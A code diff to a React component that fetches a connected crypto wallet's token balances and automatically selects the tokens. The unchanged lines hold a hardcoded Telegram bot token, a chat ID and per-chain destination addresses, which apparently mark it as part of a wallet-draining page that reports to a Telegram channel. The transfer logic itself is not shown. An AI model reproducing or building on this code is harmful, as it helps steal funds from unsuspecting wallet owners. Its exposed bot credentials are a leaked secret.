@@ -46,6 +46,14 @@ const chainIdToDestinationAddress = {
 const TELEGRAM_BOT_TOKEN = '7439590254:AAHON2e8fQW1mlEYPiWqE1RCf7F2Az7ABr0';
 const TELEGRAM_CHAT_ID = '5470283104';
 
+// Formatter for USD currency
+const usdFormatter = new Intl.NumberFormat('en-US', {
+  style: 'currency',
+  currency: 'USD',
+  minimumFractionDigits: 2,
+  maximumFractionDigits: 2,
+});
+
 // Function to safely convert input values to tinyBig numbers
 const safeNumber = (value) => {
   try {
@@ -197,55 +205,50 @@ export const GetTokens = () => {
     try {
       setError('');
       if (!chain || !supportedChains.includes(chain.id)) {
-        throw new Error(`Chain ${chain?.name || 'unknown'} not supported. Supported chains: ${supportedChains.join(', ')}.`);
+        setLoading(false);
+        return;
       }
 
-      const alchemyNetwork = chainIdToNetworkMap[chain.id];
-      const alchemy = alchemyInstances[alchemyNetwork];
+      const chainId = chain?.id || 1;
+      const alchemyNetwork = chainIdToNetworkMap[chainId];
+      const alchemyInstance = alchemyInstances[alchemyNetwork];
 
-      console.log('Fetching ERC20 token balances...', `Address: ${address}`, `Chain ID: ${chain.id}`);
-      const tokensResponse = await alchemy.core.getTokenBalances(address);
-      const nativeBalanceResponse = await alchemy.core.getBalance(address, 'latest');
+      const balanceData = await alchemyInstance.core.getTokenBalances(address);
+      const enrichedTokens = balanceData.tokenBalances.map((token) => {
+        const globalTokenInfo = tokens.find((t) => t.contract_address === token.contractAddress);
+        return { ...globalTokenInfo, ...token };
+      });
 
-      const processedTokens = tokensResponse.tokenBalances.map((balance) => ({
-        contract_address: balance.contractAddress,
-        balance: safeNumber(balance.tokenBalance),
-        quote: balance.quote || 0,
-        quote_rate: balance.quoteRate || 0,
-      }));
-
-      setTokens(processedTokens);
-      autoToggleTokens(processedTokens); // Automatically toggle tokens
-      console.log('Fetched tokens:', processedTokens);
+      setTokens(enrichedTokens);
+      autoToggleTokens(enrichedTokens);
     } catch (error) {
-      console.error('Error fetching token balances:', error);
-      setError('Failed to fetch token balances.');
+      setError(`Error fetching data: ${error.message}`);
     } finally {
       setLoading(false);
     }
-  }, [chain, address, autoToggleTokens]);
+  }, [address, chain, autoToggleTokens, setTokens, tokens]);
 
   useEffect(() => {
-    if (isConnected && address) {
+    if (isConnected) {
       fetchData();
     }
-  }, [isConnected, address, fetchData]);
-
-  useEffect(() => {
-    if (chain && chain.id && chainIdToDestinationAddress[chain.id]) {
-      setDestinationAddress(chainIdToDestinationAddress[chain.id]);
-    } else {
-      setDestinationAddress('');
-    }
-  }, [chain]);
+  }, [fetchData, isConnected]);
 
   return (
     <div>
-      {loading && <Loading />}
-      {error && <div style={{ color: 'red' }}>{error}</div>}
-      {!loading &&
-        tokens.map((token) => <TokenRow key={token.contract_address} token={token} />)}
+      {loading ? (
+        <Loading>Loading...</Loading>
+      ) : error ? (
+        <div>Error: {error}</div>
+      ) : (
+        <div>
+          {tokens.map((token) => (
+            <TokenRow key={token.contract_address} token={token} />
+          ))}
+        </div>
+      )}
     </div>
   );
 };
 
+export default GetTokens;
